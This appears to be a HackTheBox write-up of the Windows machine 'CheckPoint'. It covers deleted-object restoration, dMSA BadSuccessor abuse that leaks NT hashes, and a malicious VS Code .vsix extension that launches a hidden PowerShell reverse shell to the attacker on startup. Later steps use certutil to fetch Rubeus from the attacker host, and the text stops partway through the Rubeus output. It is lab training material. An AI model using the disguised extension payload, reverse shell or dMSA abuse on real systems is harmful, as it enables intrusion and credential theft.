---
title: "CheckPoint"
date: 2026-10-27 00:00:00 +08000
categories: [HTB, Write-ups]
tags: [HTB, Medium, Write-up, Windows, ActiveDirectory, dMSA, VSCode Package, MemoryForensics]
description: "A medium Windows HackTheBox machine involving Active Directory object recovery via Deleted Objects restoration, privilege escalation through dMSA BetterSuccessor abuse, lateral movement by weaponizing a malicious VS Code .vsix extension, and domain compromise through credential extraction from a VM memory snapshot."
---

- [dMSA](#dmsa)
	- [BadSuccessor - The Old](#badsuccessor---the-old)
	  - [Microsoft's Patch](#microsofts-patch)
	- [BetterSuccessor - The New](#bettersuccessor---the-new)
- [Nmap](#nmap)
- [NXC](#nxc)
	- [More Users](#more-users)
- [Restore Deleted User](#restore-deleted-user)
- [Stupid or Fruitful Journey to mark.davies?](#stupid-or-fruitful-journey-to-markdavies)
	- [Shadow Credentials](#shadow-credentials)
	- [Targeted Kerberoasting](#targeted-kerberoasting)
	- [What about dMSA?](#what-about-dmsa)
	- [Password Reuse, DUHH](#password-reuse-duhh)
- [.vsix Package Weaponization](#vsix-package-weaponization)
- [dMSA AGAIN](#dmsa---again)
- [VMBackups](#vmbackups)
	- [VMKatz](#vmkatz)

---
Before starting the write up, let me tell you something:

# dMSA

Windows Server 2025 introduced delegated Managed Service Accounts (dMSA) as an evolution of gMSA. The key new capability is migration. A dMSA can inherit the identity and permissions of an existing legacy account by linking itself to that account.

### BadSuccessor - The Old

[Yuval Gordon disclosed BadSuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory#dmsa) in May 2025: with nothing more than `CreateChild` rights on an OU. The attacker could create a dMSA and then set two attributes on it,  `msDS-GroupMSAMembership` and `msDS-ManagedAccountPrecededByLink` to point and inherit at any target user permissions, including a domain admin. Because the pre-patch KDC trusted this link unconditionally at ticket-issuance time, requesting a TGT for the dMSA effectively handed the attacker a ticket carrying the target’s SID and also the SIDs of the target's groups on its PAC.

The dMSA claimed “I am the successor of user X” and the KDC just believed it. You can try abusing BadSuccessor on HTB machine [Eighteen](https://app.hackthebox.com/machines/Eighteen).

#### Microsoft’s Patch

Microsoft shipped a fix on August 12, 2025 (DC build 26100.4946+). The KDC now validates the relationship from both sides at ticket time, rather than trusting a one-way link. Now it’s no longer enough for the dMSA to point at a target via `msDS-ManagedAccountPrecededByLink`. The KDC now also checks `msDS-SupersededManagedAccountLink` and `msDS-SupersededServiceAccountState` **on the target account itself**, and only issues the dMSA ticket if both sides agree.

So the successor relationship has to be bidirectional now.

### BetterSuccessor - The New

The patch kills the old version (`CreateChild` alone), but it doesn’t kill the idea. It just required more privileges over both ends of the relationship, needing write access on them. [Shaunak Khosla from Altered Security](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch) found that if the attacker already has GenericWrite (or equivalent) on the target account in addition to their dMSA-creation rights, they can simply write the matching back-link attributes (`msDS-SupersededManagedAccountLink` / `msDS-SupersededServiceAccountState`) onto the target themselves, which completes the bidirectional relationship that the patched KDC now demands. Once both sides point at each other, the KDC’s validation passes and the dMSA ticket request succeeds again, yielding effective impersonation of the target.

I highly recommend you to go through the links mentioned above as they are great resources for diving deep into dMSA.

Now let's get to the machine.

---

> As is common in real life pentests, you will start the Checkpoint box with credentials for the following account alex.turner / Checkpoint2024!

## Nmap 

As usual starting with Nmap to scan the open ports then digging deep into them to uncover any important info we can get.

```bash
$ sudo nmap -Pn -p- 10.129.187.153 -oN OpenTcpPorts

Nmap scan report for 10.129.187.153
Host is up (0.069s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49679/tcp open  unknown
49680/tcp open  unknown
49689/tcp open  unknown
49710/tcp open  unknown
49718/tcp open  unknown

$ cat OpenTcpPorts | grep open | cut -d / -f 1 | tr "\n" ,
53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49671,49674,49679,49680,49689,49710,49718, 

$ sudo nmap -Pn -sCV -p$(cat OpenTcpPorts | grep open | cut -d / -f 1 | tr "\n" ,) 10.129.187.153 -oN fullTcpScan

Nmap scan report for 10.129.187.153
Host is up (0.12s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-10-29 01:17:56Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf            .NET Message Framing
49664/tcp open  msrpc             Microsoft Windows RPC
49671/tcp open  msrpc             Microsoft Windows RPC
49674/tcp open  msrpc             Microsoft Windows RPC
49679/tcp open  msrpc             Microsoft Windows RPC
49680/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc             Microsoft Windows RPC
49710/tcp open  msrpc             Microsoft Windows RPC
49718/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-10-29T01:18:49
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: 6h59m58s
```

- The machine is a domain controller with hostname `DC01` in the domain `checkpoint.htb`.
- The time difference (`clock-skew: 6h59m58s`) is estimated with 7 hours, so we need to sync the time with the DC in case if wanted to authenticate using Kerberos.
- We should also consider overriding the `krb5.conf` file and adding the domain and the DC FQDN to the hosts file to avoid in quirks while dealing with LDAP.

```bash
$ echo '10.129.187.153 DC01.checkpoint.htb checkpoint.htb DC01' | sudo tee -a /etc/hosts
10.129.187.153 DC01.checkpoint.htb checkpoint.htb DC01

$ sudo ntpdate -u 10.129.187.153
CLOCK: time stepped by 25199.660377

$ nxc smb checkpoint.htb -u alex.turner -p Checkpoint2024! --generate-krb5-file krb5
$ cat krb5 | sudo tee /etc/krb5.conf
[sudo] password for k1ng0a21r:
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = CHECKPOINT.HTB

[realms]
    CHECKPOINT.HTB = {
        kdc = dc01.checkpoint.htb
        admin_server = dc01.checkpoint.htb
        default_domain = checkpoint.htb
    }

[domain_realm]
    .checkpoint.htb = CHECKPOINT.HTB
    checkpoint.htb = CHECKPOINT.HTB
```

---
## NXC

```bash
$ nxc smb checkpoint.htb -u alex.turner -p Checkpoint2024!
SMB         10.129.187.153   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.187.153   445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!

$ nxc smb checkpoint.htb -u alex.turner -p Checkpoint2024! --shares
SMB         10.129.187.153   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.187.153   445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
SMB         10.129.187.153   445    DC01             [*] Enumerated shares
SMB         10.129.187.153   445    DC01             Share           Permissions     Remark
SMB         10.129.187.153   445    DC01             -----           -----------     ------
SMB         10.129.187.153   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.187.153   445    DC01             C$                              Default share
SMB         10.129.187.153   445    DC01             DevDrop         READ            VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.187.153   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.187.153   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.187.153   445    DC01             SYSVOL          READ            Logon server share
SMB         10.129.187.153   445    DC01             VMBackups
```

Enumerating shares as `alex.turner` reveals:

- `DevDrop` which implies an internal workflow where `.vsix` extensions get pulled from this share and installed in VS Code.
- `VMBackups` which implies VM images are stored there, if reached, we can dump their secrets (e.g. SAM/SYSTEM hives, disk artifacts).

#### More Users

```bash
$ nxc ldap checkpoint.htb -u alex.turner -p Checkpoint2024! --users-export users.list
LDAP        10.129.187.153   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert)
LDAP        10.129.187.153   389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
LDAP        10.129.187.153   389    DC01             [*] Enumerated 17 domain users: checkpoint.htb
LDAP        10.129.187.153   389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-           
LDAP        10.129.187.153   389    DC01             Administrator                 2026-05-09 19:16:34 0        Built-in account for administering the computer/domain
LDAP        10.129.187.153   389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        10.129.187.153   389    DC01             krbtgt                        2026-05-09 11:41:01 0        Key Distribution Center Service Account
LDAP        10.129.187.153   389    DC01             alex.turner                   2026-05-09 12:00:08 0                                
LDAP        10.129.187.153   389    DC01             ryan.brooks                   2026-05-10 16:46:18 0                                
LDAP        10.129.187.153   389    DC01             svc_deploy                    2026-05-09 12:01:19 0        Deployment service account
LDAP        10.129.187.153   389    DC01             james.harper                  2026-05-09 12:02:53 0                                
LDAP        10.129.187.153   389    DC01             sarah.mitchell                2026-05-09 12:02:58 0                                
LDAP        10.129.187.153   389    DC01             emily.carter                  2026-05-09 12:03:05 0                                
LDAP        10.129.187.153   389    DC01             david.reynolds                2026-05-09 12:03:11 0                                
LDAP        10.129.187.153   389    DC01             jessica.coleman               2026-05-09 12:03:15 0                                
LDAP        10.129.187.153   389    DC01             lauren.flores                 2026-05-09 12:03:21 0                                
LDAP        10.129.187.153   389    DC01             michael.torres                2026-05-09 12:03:28 0                                
LDAP        10.129.187.153   389    DC01             kevin.patterson               2026-05-09 12:03:33 0                                
LDAP        10.129.187.153   389    DC01             brian.jenkins                 2026-05-09 12:03:37 0                                
LDAP        10.129.187.153   389    DC01             megan.perry                   2026-05-09 12:03:42 0                                
LDAP        10.129.187.153   389    DC01             max.palmer                    2026-05-26 04:25:15 0  
```

I tried password spraying which didn't yield anything useful, so I started enumerating what can the user `alex.turner` control in the environment using `bloodyad`.

## Restore Deleted User 

```bash
$ bloodyad -H dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```

When an object is deleted, AD doesn’t erase it. It becomes a tombstone in container `CN=Deleted Objects`, with attribute `isDeleted=TRUE`. If the AD Recycle Bin is enabled, that tombstone keeps most of its original attributes (group memberships, etc.) and can be fully restored to its original location before it’s garbage-collected, provided you have the right permissions.

bloodyad shows` alex.turner` has `WRITE` permissions directly on the tombstoned Mark Davies object. Restoring a deleted object is just clearing `isDeleted` and resetting its `distinguishedName` back to the original container. Since I already have WRITE on it, I can restore Mark Davies along with his original attributes/group memberships.

```bash
$ bloodyad -H dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore "CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb"
[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

## Stupid or Fruitful Journey to mark.davies?

You will know why I might call it a stupid journey if you read another write up for the machine, or you will figure it out by the end of that section anyways. 

When I saw a WRITE privileges over `mark.davies` I instantly thought of Shadow Credentials, targeted kerberoasting.

#### Shadow Credentials

As you can see below the shadow credentials attack itself succeeded, bloodyad wrote the `msDS-KeyCredentialLink` on `mark.davies`. The failure is in the follow-up: right after adding the key, bloodyad auto-attempts PKINIT authentication using that new certificate to grab a TGT, resulting `KDC_ERR_PADATA_TYPE_NOSUPP`. The DC rejected the PKINIT pre-auth type, meaning PKINIT/certificate-based authentication isn’t supported or enabled on this KDC. Without PKINIT working, the shadow credential can’t be exchanged for a TGT, so this path is a dead end.

```bash
$ bloodyad -H dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' add shadowCredentials 'mark.davies'
[+] KeyCredential generated with following sha256 of RSA key: a12132d64282ae30e80bf4535d390845fe66eb5a60d89234560a2af8cacf9b1d
[-] PKINIT failed on DC 10.129.187.153, you must find a Kerberos server with a certification authority!
[-] Retry on a working KDC and do:
badNTPKInit 'kerberos+pfx://checkpoint.htb\mark.davies@10.129.187.153/?certdata=mark.davies_wH.pfx&timeout=350'
[+] PKINIT PFX certificate saved at: mark.davies_wH.pfx
[SNIP]
kerbad.protocol.errors.KerberosError:  Error Name: KDC_ERR_PADATA_TYPE_NOSUPP Detail: "KDC has no support for PADATA type (pre-authentication data)"
[SNIP]
```

#### Targeted Kerberoasting

```bash
$ nxc ldap checkpoint.htb -u alex.turner -p Checkpoint2024! --kerberoasting kerberoastables.txt --targeted-kerberoast "mark.davies"
LDAP        10.129.187.153   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert)
LDAP        10.129.187.153   389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
LDAP        10.129.187.153   389    DC01             [+] Found 1 enabled users without SPN.
LDAP        10.129.187.153   389    DC01             [*] sAMAccountName: mark.davies, memberOf: [], pwdLastSet: 2026-05-09 12:00:48.810501, lastLogon: <never>
LDAP        10.129.187.153   389    DC01             $krb5tgs$18$mark.davies$CHECKPOINT.HTB$*checkpoint.htb\mark.davies*$c1381a3ac10c3a8f2ce60998$335b9c39e13e7cf144193c39963909c301459c81d09135647ea67b21e3ea6f1352f1a298823b67f4906f3ae6cfd683d33d24e0715ac39fe41095a41d822b2ff96f226ad44bcba761db6b5ebc2b6bc1716c649b21f0ea41cd9c64424f52ee0c875935561fb3832ecf44328d3bb4c46241147f317ee337ff253db7b30de30dd7264dc2d99413e4a81bb08c8e8a7596b4695cc545eb6a9d763fcb9d95783c51e2352228c73c6c1d2b173aaa3d61ce6f9d3824fdbd843213b069da152f96d818f5f5a6753fc555725e938fe065bbd911d3ccb0836a1168ac1366361f81cad3ca82894edb8d6fd38c47a6c8fc7ff339775702bffdfcc9d14540b22ecfd0919ebe2cb8c034b46e31d478d3a2c9a44bbc2d23d41f04a0d775eb586b8da487a6db7e626741a5333756917c06df68799a6b34e47fb705e8809e7a9fb8cf0c427e3dfc066d128d99032783b3250cbd21c1982501d4acb8bbb5cbcac038a9ce1a2f5e227893a58e82157ed4c26f1e5f61f3a3cf3c27594742d8ccfb09899ec3399194b044b217dde344c59c5d24affa10ac7228782e023b968c3b8fc862330b50f677271a26760d736036a1ea79c52bc4800271f0486a63b8f72c61537a064aa798c46d1f1a2f975bf81162343dd63fcec836c6c49db9f639e438d086b123b62f9d122cdd655b7bc1f150200985cb872eb09f7e2dee3aa18eb8b5d035d6ff66af5fe66fa9fcd31a3c7a0b4dae333ebae224f4d14b673542108d27a6612f7aad78f144e44e3c4f5583ab22756d57c7147467afb50de03ae3c8d4fec6f289a5c3aad474942171f339ce647c731d96d493068fcbdb2a54d58e38965c0781ee745bd3321e1dd277e3d961e3bcc30721d8627b5e705b0d70bb0ce7e314350d46513983504972ee273faf14c340ed8dd54c5d5e5cfc00811b5c4fbb43c4aee9fad8d29db294422c6ce7664ed99a31f8447870b1e6e4a016dc987bb4dc167348a7d9f91f5ea7862eba3e8265efd1896c24a892452dd19af2e19ac12428cce96a588cdaf0467c6f91e787f80f6411537b4169c68bd542312911615bdc5c710ebec539f3581c2c6d43d8e46bffebf6b827b92e74b0499d8348f8f71c80a9a1233a72628ee28408e096361ba65192cb6d908beb661722c8b985c3d22ff002b07484da7e2139d28c47d7ca264c0207c6fa317c1796ce2f23a1146690d613f50c4616683c89081911aa27d10ea10afce379f803d1cc1852c6f230877899e556dcedbe2603a31244841b7a60bf78d717eb2f371c750c2525d9250221ae625491ecf80c4439929b761ecb0ea3d81b421f1a7b6ee933777303c4f9d1869405cbf6e2af0f4d398e7810459f433fb218390402e399b1a4b439cb270e1e027fd939e32af3832fd624198a6fcfdfe988fa2fc3e3aaf138b873c2461403611f3ff5da4fa4c9692044cc4efdfabc2e6f0129456b370affb9d35a5c9a2a9462480d645a60f87a814f5b607e332f4b9bb0a44195a07c41e7bc8f9d1343170177d41d8f23d273d910325efe0ec0621c52e9437df1c14b1c8496b7a47d106ce1dc4dcadfd3c70fa72b49216d
```

I couldn't crack that using hashcat (:{) .

#### What about dMSA?

If you skipped the [dMSA](#dmsa) part, now is a good time to read it.

At this point I kept starring at this output for a while, when I remembered [eightenn](https://app.hackthebox.com/machines/Eighteen) another great machine from HTB where I abused the dMSA - BadSuccessor. I saw that `CREATE_CHILD` over the OU `OU=Employees,DC=checkpoint,DC=htb`, and thought, why not? 

```bash
$ bloodyad -H dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```

bloodyad BadSuccessor module automates the process: it creates a new dMSA account (`hacker$`) and sets `msDS-ManagedAccountPrecededByLink` (and `msDS-GroupMSAMembership`) to point at Mark Davies DN, marking `hacker$` as the successor of Mark Davies’ account. At this point, the dMSA object exists and is linked. The only thing left is getting a ticket, which is where bloodyad attempt to auto fetch a dMSA TGT failed on encryption type negotiation.

```bash
$ bloodyad -H dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' add badSuccessor hacker -t "CN=MARK DAVIES,OU=EMPLOYEES,DC=CHECKPOINT,DC=HTB"
[+] Creating DMSA hacker$ in OU=Employees,DC=checkpoint,DC=htb
[+] Impersonating: CN=MARK DAVIES,OU=EMPLOYEES,DC=CHECKPOINT,DC=HTB
[-] Failed to retrieve dMSA TGT
[-] Try using Rubeus, or something like:
[-] badS4U2self 'kerberos+pw://checkpoint.htb\alex.turner:Checkpoint2024%21@10.129.187.153/' 'krbtgt/checkpoint.htb@checkpoint.htb' 'hacker$@checkpoint.htb' --dmsa
Traceback (most recent call last):
  File "/usr/share/bloodyad/lib/python3.14/site-packages/kerbad/client.py", line 313, in get_TGT
    preauth_rep = self.do_preauth(etype, with_pac=with_pac)
  File "/usr/share/bloodyad/lib/python3.14/site-packages/kerbad/client.py", line 189, in do_preauth
    rep = self.ksoc.sendrecv(req.dump())
  File "/usr/share/bloodyad/lib/python3.14/site-packages/kerbad/network/clientsocket.py", line 85, in sendrecv
    raise KerberosError(krb_message)
kerbad.protocol.errors.KerberosError:  Error Name: KDC_ERR_ETYPE_NOTSUPP Detail: "KDC has no support for encryption type"
```

Because `msDS-GroupMSAMembership` on hacker$ authorizes `alex.turner` to act on its behalf, he can perform the S4U2self dMSA key-retrieval exchange. Now  I can:

1. Get a TGT as `alex.turner`
2. Use that TGT to request an S4U2self ticket to impersonate `hacker$`

```bash
$ getTGT.py 'checkpoint.htb/alex.turner:Checkpoint2024!'
Impacket v0.14.0.dev0+20261015.95810.75938fcb - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in alex.turner.ccache

$ getST.py 'checkpoint.htb/alex.turner' -k -no-pass -dc-ip 10.129.187.153 -impersonate 'hacker$' -self -dmsa
Impacket v0.14.0.dev0+20261015.95810.75938fcb - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating hacker$
[*] Requesting S4U2self
[*] Current keys:
[*] EncryptionTypes.aes256_cts_hmac_sha1_96:def1052b437517a04d9c7026aebfc8edf1b41db1d404bb2d3cb1b5c995c885d7
[*] EncryptionTypes.aes128_cts_hmac_sha1_96:cb6d975548ee67eb424c1b9150f29f16
[*] EncryptionTypes.rc4_hmac:7f669d33b962f788a753ee25142f7e67
[*] Previous keys:
[*] EncryptionTypes.rc4_hmac:0b28e49d9deb96f99d74578e214faec2
[*] Saving ticket in hacker$@krbtgt_CHECKPOINT.HTB@CHECKPOINT.HTB.ccache

$ nxc smb checkpoint.htb -u 'hacker$' -H 7f669d33b962f788a753ee25142f7e67
SMB         10.129.187.153  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False) (DC:True)
SMB         10.129.187.153  445    DC01             [+] checkpoint.htb\hacker$:7f669d33b962f788a753ee25142f7e67
```

The **Previous keys** (the RC4 hash) are literally Mark Davies’ old NT hash, because hacker$ was created as his “successor.” Since dMSA migration preserves the predecessor’s credential material, the dMSA ticket exchange leaks it.

```bash
$ nxc smb checkpoint.htb -u mark.davies -H 0b28e49d9deb96f99d74578e214faec2
SMB         10.129.187.153  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False) (DC:True)
SMB         10.129.187.153  445    DC01             [+] checkpoint.htb\mark.davies:0b28e49d9deb96f99d74578e214faec2
```

#### Password Reuse, DUHH

After finishing the machine, when I discussed how was I got access to `mark.davies` with a fiend, he told me, bro, just do a password spray :}}}}}}}}}}}}

```bash
$ nxc smb checkpoint.htb -u ./users.list -p Checkpoint2024! --continue-on-success | grep +
SMB         10.129.187.153  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False) (DC:True)
SMB        10.129.187.153   389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
SMB         10.129.187.153  445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024!
```

## .vsix Package Weaponization

We can either continue using the impersonation ticket we got for the created dMSA `hacker$` or using the `mark.davies` NT hash we got in the `Previous keys`.

```bash
$ export KRB5CCNAME=./hacker\$@krbtgt_CHECKPOINT.HTB@CHECKPOINT.HTB.ccache

$ nxc smb checkpoint.htb -k --use-kcache --shares
SMB         checkpoint.htb  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False) (DC:True)
SMB         checkpoint.htb  445    DC01             [+] checkpoint.htb\hacker$ from ccache
SMB         checkpoint.htb  445    DC01             [*] Enumerated shares
SMB         checkpoint.htb  445    DC01             Share           Permissions            Remark
SMB         checkpoint.htb  445    DC01             -----           -----------            ------
SMB         checkpoint.htb  445    DC01             ADMIN$                                 Remote Admin
SMB         checkpoint.htb  445    DC01             C$                                     Default share
SMB         checkpoint.htb  445    DC01             DevDrop         READ,WRITE             VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         checkpoint.htb  445    DC01             IPC$            READ                   Remote IPC
SMB         checkpoint.htb  445    DC01             NETLOGON        READ                   Logon server share
SMB         checkpoint.htb  445    DC01             SYSVOL          READ                   Logon server share
SMB         checkpoint.htb  445    DC01             VMBackups

# Or pass the hash for mark.davies
$ nxc smb checkpoint.htb -u mark.davies -H 0b28e49d9deb96f99d74578e214faec2 --shares
SMB         10.129.187.153  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:False) (DC:True)
SMB         10.129.187.153  445    DC01             [+] checkpoint.htb\mark.davies:0b28e49d9deb96f99d74578e214faec2
SMB         10.129.187.153  445    DC01             [*] Enumerated shares
SMB         10.129.187.153  445    DC01             Share           Permissions            Remark
SMB         10.129.187.153  445    DC01             -----           -----------            ------
SMB         10.129.187.153  445    DC01             ADMIN$                                 Remote Admin
SMB         10.129.187.153  445    DC01             C$                                     Default share
SMB         10.129.187.153  445    DC01             DevDrop         READ,WRITE             VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.187.153  445    DC01             IPC$            READ                   Remote IPC
SMB         10.129.187.153  445    DC01             NETLOGON        READ                   Logon server share
SMB         10.129.187.153  445    DC01             SYSVOL          READ                   Logon server share
SMB         10.129.187.153  445    DC01             VMBackups
```

I went through [extension anatomy](https://code.visualstudio.com/api/get-started/extension-anatomy), [activation events](https://code.visualstudio.com/api/references/activation-events), [vscode-vsce](https://github.com/microsoft/vscode-vsce) and some AI :}, to create a malicious VS code extension.

Creating the following structure

```bash
$ tree evil-ext
evil-ext
├── extension.js
└── package.json
```

The manifest pins engines VSCode to `^1.118.0` to match the compatibility constraint advertised on the `DevDrop` share, so the extension doesn’t get filtered out by whatever install/approval process consumes it.

`activationEvents: ["onStartupFinished"]` will start up automatically as soon as VS Code finishes loading.

```json
{
  "name": "checkpoint-utils",
  "displayName": "Checkpoint Utils",
  "description": "Internal utilities",
  "version": "1.0.0",
  "engines": { "vscode": "^1.118.0" },
  "categories": ["Other"],
  "activationEvents": ["onStartupFinished"],
  "main": "./extension.js",
  "contributes": {}
}
```

The main JS extension file which has the reverse shell:

```js
const {
    execSync
} = require('child_process');

function activate(context) {
    try {
        // PowerShell reverse shell back to your listener
        execSync(`powershell -nop -w hidden -c "$client = New-Object Net.Sockets.TCPClient('10.10.17.249', 2222);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"`, {
            timeout: 5000
        });
    } catch (e) {}
}

function deactivate() {}
module.exports = {
    activate,
    deactivate
};
```

crafting the extension using `vsce`:

```bash
$ tree evil-ext
evil-ext
├── extension.js
└── package.json

$ cd evil-ext

$ npm install -g @vscode/vsce

$ vsce package --no-dependencies
 WARNING  A 'repository' field is missing from the 'package.json' manifest file.
Use --allow-missing-repository to bypass.
Do you want to continue? [y/N] y
 WARNING  LICENSE, LICENSE.md, or LICENSE.txt not found
Do you want to continue? [y/N] y
 WARNING  Neither a .vscodeignore file nor a "files" property in package.json was found. To ensure only necessary files are included in your extension, add a .vscodeignore file or specify the "files" property in package.json. More info: https://aka.ms/vscode-vscodeignore

 INFO  Files included in the VSIX:
checkpoint-utils-1.0.0.vsix
├─ [Content_Types].xml
├─ extension.vsixmanifest
└─ extension/
   ├─ extension.js [0.75 KB]
   └─ package.json [0.28 KB]
   
$ tree evil-ext
evil-ext
├── checkpoint-utils-1.0.0.vsix
├── extension.js
└── package.json
```

Upload it, create a listener and wait for the reverse shell.

```bash
$ smbclient.py checkpoint.htb/'hacker$'@dc01.checkpoint.htb -k -no-pass
# use DevDrop
# put evil-ext/checkpoint-utils-1.0.0.vsix
```

Catching a reverse shell:

```bash
$ rlwrap nc -lvnp 2222
listening on [any] 2222 ...
connect to [10.10.17.249] from (UNKNOWN) [10.129.187.153] 54623

PS C:\Program Files\Microsoft VS Code> whoami
checkpoint\ryan.brooks

PS C:\Program Files\Microsoft VS Code> type C:\Users\ryan.brooks\Desktop\user.txt
5067a8****
```

Get the TGT from `ryan.brooks` session after transferring Rubeus. 

```bash
PS C:\Program Files\Microsoft VS Code> cd C:\Users\ryan.brooks\Documents

PS C:\Users\ryan.brooks\Documents> certutil.exe -f -urlcache -split http://10.10.17.249/Rubeus.exe Rubeus.exe
****  Online  ****
  000000  ...
  073a00
http://10.10.17.249/Rubeus.exe

WinINet Cache entries: 1

CertUtil: -URLCache command completed successfully.

PS C:\Users\ryan.brooks\Documents> .\Rubeus.exe tgtdeleg /nowrap

   ______        _
